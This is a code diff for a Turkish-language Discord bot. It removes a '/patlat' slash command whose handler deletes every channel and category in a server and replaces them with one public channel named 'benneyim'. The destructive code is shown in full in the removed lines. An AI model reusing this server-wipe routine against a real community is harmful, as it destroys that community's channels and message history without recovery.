@@ -400,9 +400,7 @@
             .setName('kayıt-setup')
             .setDescription('Kayıt sistemi kurulum mesajını gönderir.')
             .addChannelOption(option => option.setName('kanal').setDescription('Kayıt kanalı').setRequired(true)),
-        new SlashCommandBuilder()
-            .setName('patlat')
-            .setDescription('Sunucudaki tüm kanalları siler ve yeni kanal oluşturur.'),
+
         new SlashCommandBuilder()
             .setName('dm-duyur')
             .setDescription('Belirtilen kullanıcıya veya herkese DM gönderir.')
@@ -1056,63 +1054,7 @@
             }
         }
 
-        if (interaction.commandName === 'patlat') {
-            const yetkiliRolID = '1401227942498930760';
-            if (!interaction.member.roles.cache.has(yetkiliRolID)) {
-                return interaction.reply({ content: '❌ Bu komutu kullanmak için yetkin yok!', ephemeral: true });
-            }
 
-            try {
-                await interaction.deferReply({ ephemeral: true });
-                
-                const guild = interaction.guild;
-                
-                // Tüm kanalları sil
-                const channels = guild.channels.cache;
-                for (const [id, channel] of channels) {
-                    try {
-                        if (channel.type !== ChannelType.GuildCategory) {
-                            await channel.delete();
-                            console.log(`Kanal silindi: ${channel.name}`);
-                        }
-                    } catch (error) {
-                        console.error(`Kanal silinirken hata: ${channel.name}`, error);
-                    }
-                }
-
-                // Tüm kategorileri sil
-                const categories = guild.channels.cache.filter(channel => channel.type === ChannelType.GuildCategory);
-                for (const [id, category] of categories) {
-                    try {
-                        await category.delete();
-                        console.log(`Kategori silindi: ${category.name}`);
-                    } catch (error) {
-                        console.error(`Kategori silinirken hata: ${category.name}`, error);
-                    }
-                }
-
-                // Yeni kanal oluştur
-                const newChannel = await guild.channels.create({
-                    name: 'benneyim',
-                    type: ChannelType.GuildText,
-                    permissionOverwrites: [
-                        {
-                            id: guild.roles.everyone.id,
-                            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory]
-                        }
-                    ]
-                });
-
-                // Bot mesajı gönder
-                await newChannel.send('benneyim');
-
-                await interaction.editReply({ content: '✅ Tüm kanallar silindi ve yeni kanal oluşturuldu!' });
-                
-            } catch (error) {
-                console.error('Patlat komutu hatası:', error);
-                await interaction.editReply({ content: '❌ Bir hata oluştu!' });
-            }
-        }
 
         if (interaction.commandName === 'dm-duyur') {
             const yetkiliRolID = '1401227942498930760';
@@ -1223,7 +1165,6 @@
                     '`/status <online/idle/dnd/invisible>` → Bot durumunu değiştirir\n' +
                     '`/renk-rol` → Renk rolleri sistemini aktif eder\n' +
                     '`/kayıt-setup` → Kayıt sistemi kurulum mesajını gönderir\n' +
-                    '`/patlat` → Sunucudaki tüm kanalları siler ve yeni kanal oluşturur\n' +
                     '`/dm-duyur <kullanıcı/all> <mesaj>` → Belirtilen kullanıcıya veya herkese DM gönderir\n'
                 )
                 .setColor(0x3498db)
